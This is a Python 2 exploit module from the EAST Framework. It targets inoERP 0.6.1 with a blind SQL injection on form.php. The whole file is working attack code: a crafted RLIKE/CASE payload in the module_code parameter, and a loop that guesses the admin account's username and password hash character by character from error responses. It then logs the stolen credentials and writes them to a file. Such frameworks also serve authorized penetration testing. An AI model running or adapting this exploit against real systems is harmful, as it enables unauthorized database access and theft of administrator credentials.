#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import urllib2
import string
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_inoerp_bsqli"
INFO['DESCRIPTION'] = "inoERP 0.6.1 - SQL Injection "
INFO['VENDOR'] = "http://inoideas.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41749/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """
An attacker could use the SQL Injection to access the database in an unsafe way.
"""
INFO['CHANGELOG'] = "03 Apr 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["BASEPATH"] = '/inoerp', dict(description = 'Path of Exponent CMS')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.ssl = False
        self.port = port
        self.host = host
        self.basepath = '/inoerp'
        self.pool = string.ascii_letters + string.digits + ':$/\\+'
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        
        self.url = self.make_url('/form.php?')
        self.data = "module_code=1%27 RLIKE (SELECT(CASE WHEN (SUBSTR((SELECT CONCAT(username,CHAR(58),password) FROM ino_user where ino_user_id=1),{pos},1)=CHAR({char})) THEN 1 ELSE 0x28 END))-- EaST"
        self.data = self.data.replace(' ', '%20')
        
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def guess_letter(self, pos):
        for c in self.pool:
            data = self.data.format(pos = pos, char = ord(c))
            try:
                fd = urllib2.urlopen(self.url + data)
                if 'Fatal error' in fd.read():
                    continue
                else:
                    return c
            except Exception as e:
                return None
        return None
        
    def run(self):
        self.args()
        self.log('')
        
        self.log('Begin extracting admin\'s credentials')
        self.log('This may take about 15 minutes')
        
        i, result = 1, ''
        char = self.guess_letter(i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(i)
        
        if result:
            self.log('End with: {}'.format(result))
            self.writefile(result)
            self.finish(True)
            return 1
        
        self.log('Failed')
        self.finish(False)
        return 0

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()